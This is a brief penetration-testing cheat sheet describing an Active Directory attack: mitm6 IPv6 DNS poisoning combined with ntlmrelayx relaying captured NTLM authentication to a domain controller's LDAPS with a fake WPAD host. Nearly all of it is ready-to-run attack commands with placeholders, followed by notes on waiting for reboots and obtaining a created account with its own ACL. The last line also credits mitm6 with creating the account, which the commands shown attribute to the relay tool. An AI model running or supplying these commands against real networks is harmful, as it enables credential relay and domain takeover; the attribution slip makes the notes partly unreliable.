### Tooling
1. NTLM relay
2. mitm6

### Methodology
#### Set up mitm6
```sh
mitm6 -d <domain_name>
```

#### Set up NTLM relay
```sh
ntlmrelayx.py -6 -t ldaps://<domain_controller_ip_address> -wh fakewpad.<domain_name> -l <name_of_the_loot>
```

Restart the machine in the domain and wait. This should bring information of things in the domain. 

When you login mitm6 is going to create a user for you, with its own ACL for you to use. 
